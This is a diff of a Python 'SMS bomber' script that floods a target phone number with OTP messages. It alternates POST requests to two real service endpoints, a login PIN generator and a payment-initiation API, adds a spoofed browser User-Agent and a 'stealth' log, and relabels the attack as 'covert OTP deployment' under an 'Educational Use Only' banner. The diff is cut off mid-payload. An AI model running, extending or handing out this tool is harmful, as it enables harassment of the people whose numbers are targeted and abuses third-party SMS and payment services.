@@ -1,69 +1,107 @@
+#!/usr/bin/env python3
 import requests
 import time
 import sys
+import os
 from colorama import init, Fore, Style, Back
 import re
+from datetime import datetime
 
-# Initialize colorama for colored output in Termux
+# Initialize colorama and set up logging
 init()
+LOG_FILE = "sycho_log.txt"
 
 # Constants
-KEY = "Sycho"
+KEY = "Sycho"  # Secure access key
+USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
 
-# Function to validate phone number (basic validation)
+# Function to initialize or append to log file
+def log_action(message):
+    """Log actions to a file for stealth tracking."""
+    with open(LOG_FILE, "a") as log:
+        log.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
+
+# Function to validate phone number
 def is_valid_phone(phone):
+    """Validate phone number with regex for professional input handling."""
     return bool(re.match(r'^\+?\d{10,15}$', phone))
 
-# Function to display the exact colorful ASCII art banner with watermark
+# Function to display the fixed ASCII art banner with SYCHO
 def display_banner():
+    """Display a custom ASCII art banner with SYCHO prominently below."""
     banner = f"""
-{Back.BLACK + Fore.RED}   H{Back.BLACK + Fore.GREEN}A{Back.BLACK + Fore.BLUE}C{Back.BLACK + Fore.YELLOW}K{Back.BLACK + Fore.MAGENTA}I{Back.BLACK + Fore.CYAN}N{Back.BLACK + Fore.RED}G{Back.BLACK + Fore.GREEN} {Back.BLACK + Fore.BLUE}T{Back.BLACK + Fore.YELLOW}O{Back.BLACK + Fore.MAGENTA}O{Back.BLACK + Fore.CYAN}L{Back.BLACK + Fore.RED} {Back.BLACK + Fore.GREEN}v{Back.BLACK + Fore.BLUE}2{Back.BLACK + Fore.YELLOW}.{Back.BLACK + Fore.MAGENTA}2
+{Back.BLACK + Fore.RED + Style.BRIGHT}/**
+{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
+{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
+{Back.BLACK + Fore.YELLOW + Style.BRIGHT}* *{Fore.YELLOW} oooooooo8 ooooo  oooo oooooooo8 ooooo ooooo  ooooooo   *
+{Back.BLACK + Fore.GREEN + Style.BRIGHT}* *{Fore.GREEN}888          888  88 o888     88  888   888 o888   888o *
+{Back.BLACK + Fore.CYAN + Style.BRIGHT}* *{Fore.CYAN} 888oooooo     888   888          888ooo888 888     888 *
+{Back.BLACK + Fore.MAGENTA + Style.BRIGHT}* *{Fore.MAGENTA}        888    888   888o     oo  888   888 888o   o888 *
+{Back.BLACK + Fore.RED + Style.BRIGHT}* *{Fore.RED}o88oooo888    o888o   888oooo88  o888o o888o  88ooo88   *
+{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
+{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
+{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
+{Back.BLACK + Fore.RED + Style.BRIGHT}   ____  _   _ _________ _       
+{Back.BLACK + Fore.RED + Style.BRIGHT}  / ___|| | | |__  / ___| |___  
+{Back.BLACK + Fore.RED + Style.BRIGHT}  \___ \| |_| | / /| |   | / __| 
+{Back.BLACK + Fore.RED + Style.BRIGHT}   ___) |  _  |/ /_| |___| \__ \ 
+{Back.BLACK + Fore.RED + Style.BRIGHT}  |____/|_| |_|____\____|_|___/
 {Back.BLACK + Fore.RED}═══════════════════════════════════════
-{Back.BLACK + Fore.GREEN}         {Back.BLACK + Fore.RED}S{Back.BLACK + Fore.GREEN}Y{Back.BLACK + Fore.BLUE}C{Back.BLACK + Fore.YELLOW}H{Back.BLACK + Fore.MAGENTA}O{Back.BLACK + Fore.CYAN} {Back.BLACK + Fore.RED}S{Back.BLACK + Fore.GREEN}M{Back.BLACK + Fore.BLUE}S{Back.BLACK + Fore.YELLOW} {Back.BLACK + Fore.MAGENTA}B{Back.BLACK + Fore.CYAN}O{Back.BLACK + Fore.RED}M{Back.BLACK + Fore.GREEN}B{Back.BLACK + Fore.BLUE}E{Back.BLACK + Fore.YELLOW}R
-{Back.BLACK + Fore.MAGENTA}═══════════════════════════════════════
-{Back.BLACK + Fore.CYAN + Style.DIM}   company : FlyZero Official Copyrig   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   github : https://github.com/nishakorzhik   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   Coded By : Misha Korzhik (Мiша Коржик)   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   ATTENTION! The author of this article is not responsible   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   for any consequences of reading it   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   All materials are provided for educational purposes only!   {Style.RESET_ALL}
-{Back.BLACK + Fore.CYAN + Style.DIM}   SychoX2006 - 2025                   {Style.RESET_ALL}
+{Back.BLACK + Fore.RED}         SYCHO SMS BOMBER v2.6
+{Back.BLACK + Fore.RED}═══════════════════════════════════════
+{Back.BLACK + Fore.RED + Style.DIM}   Coded by SychoX2006 - 2025       {Style.RESET_ALL}
+{Back.BLACK + Fore.RED + Style.DIM}   Purpose: Advanced OTP Testing    {Style.RESET_ALL}
+{Back.BLACK + Fore.RED + Style.DIM}   ⚠️ Educational Use Only!         {Style.RESET_ALL}
+{Back.BLACK + Fore.RED}═══════════════════════════════════════
 {Style.RESET_ALL}"""
     print(banner)
+    log_action("Banner displayed. Operation initialized.")
 
-# Function to check access key
+# Function to check access key with anti-brute-force delay
 def check_key():
-    print(f"{Fore.MAGENTA}🔑 Enter Access Key:{Style.RESET_ALL}")
-    key_input = input().strip()
-    if key_input == KEY:
-        print(f"{Fore.GREEN}✅ Access Granted! Welcome, Sycho!{Style.RESET_ALL}")
-        return True
-    else:
-        print(f"{Fore.RED}❌ Invalid Key! Try again, bro.{Style.RESET_ALL}")
-        time.sleep(3)
-        return False
+    """Authenticate with a secure key check and delay on failure."""
+    attempts = 0
+    max_attempts = 3
+    while attempts < max_attempts:
+        print(f"{Fore.RED}🔑 Enter Access Key: {Style.RESET_ALL}")
+        key_input = input().strip()
+        if key_input == KEY:
+            print(f"{Fore.GREEN}✅ Access Granted! Welcome, Sycho.{Style.RESET_ALL}")
+            log_action("Access granted successfully.")
+            return True
+        else:
+            attempts += 1
+            remaining = max_attempts - attempts
+            print(f"{Fore.RED}❌ Invalid Key! {remaining} attempts remaining.{Style.RESET_ALL}")
+            log_action(f"Failed login attempt {attempts}/{max_attempts}.")
+            time.sleep(2 ** attempts)  # Exponential backoff (2s, 4s, 8s)
+    print(f"{Fore.RED}🔒 Max attempts reached. Exiting.{Style.RESET_ALL}")
+    log_action("Max login attempts exceeded. Operation terminated.")
+    sys.exit(1)
 
-# Function to send OTPs
+# Function to send OTPs with advanced tracking
 def send_otp(phone, count):
+    """Deploy OTPs with professional-grade error handling and logging."""
     if not is_valid_phone(phone):
-        print(f"{Fore.RED}📵 Invalid phone number! Use format like +923xxxxxxxxx or 03xxxxxxxxx.{Style.RESET_ALL}")
+        print(f"{Fore.RED}📵 Invalid phone number! Use +923xxxxxxxxx format.{Style.RESET_ALL}")
+        log_action(f"Invalid phone number: {phone}")
         return
     if not isinstance(count, int) or count < 1 or count > 100:
-        print(f"{Fore.RED}❌ OTP count must be between 1 and 100.{Style.RESET_ALL}")
+        print(f"{Fore.RED}❌ OTP count must be 1-100.{Style.RESET_ALL}")
+        log_action(f"Invalid OTP count: {count}")
         return
 
-    print(f"{Fore.YELLOW}💥 Firing up OTP bombing...{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}💥 Initiating covert OTP deployment...{Style.RESET_ALL}")
+    log_action(f"Starting OTP deployment for {phone} with count {count}.")
+    success_count = 0
     for i in range(count):
         try:
+            headers = {"User-Agent": USER_AGENT}
             if i % 2 == 0:
                 url = f"https://bajao.pk/api/v2/login/generatePin?uuid={phone}"
-                response = requests.post(url)
+                response = requests.post(url, headers=headers)
             else:
                 url = "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage"
-                headers = {
-                    "Content-Type": "application/json",
-                    "accept": "application/json"
-                }
                 payload = {
                     "Version": "V1",
                     "Language": "en",
@@ -71,41 +109,4 @@ def send_otp(phone, count):
                     "ProductId": 1733,
                     "MobileNo": phone,
                     "OperatorId": "100007",
-                    "URL": "https://www.tapmad.com/sign-up",
-                    "source": "organic",
-                    "medium": "organic"
-                }
-                response = requests.post(url, headers=headers, json=payload)
-            
-            print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} Sent! 💥{Style.RESET_ALL}")
-        except requests.RequestException as e:
-            print(f"{Fore.RED}⚠️ Failed OTP {i + 1}: {e}{Style.RESET_ALL}")
-        time.sleep(0.5)  # Small delay to avoid server overload
-
-    print(f"{Fore.GREEN}🎉 All {count} OTPs Fired Successfully! 🚀{Style.RESET_ALL}")
-
-# Main function
-def main():
-    display_banner()
-    while not check_key():
-        display_banner()  # Redisplay banner if key is wrong
-    while True:
-        print(f"\n{Fore.MAGENTA}📱 Enter Target Phone Number (e.g., +923xxxxxxxxx or 03xxxxxxxxx):{Style.RESET_ALL}")
-        phone = input().strip()
-        print(f"{Fore.MAGENTA}🔢 Enter OTP Count (1-100):{Style.RESET_ALL}")
-        try:
-            count = int(input())
-            send_otp(phone, count)
-        except ValueError:
-            print(f"{Fore.RED}❌ Invalid OTP count! Enter a number, bro.{Style.RESET_ALL}")
-        print(f"\n{Fore.YELLOW}🔥 Want to bomb again? (y/n):{Style.RESET_ALL}")
-        if input().lower() != 'y':
-            print(f"{Fore.CYAN}👋 Peace out, SychoX2006! Stay legendary!{Style.RESET_ALL}")
-            break
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Fore.RED}🚨 Mission Aborted by Sycho!{Style.RESET_ALL}")
-        sys.exit(0)
+                    "URL
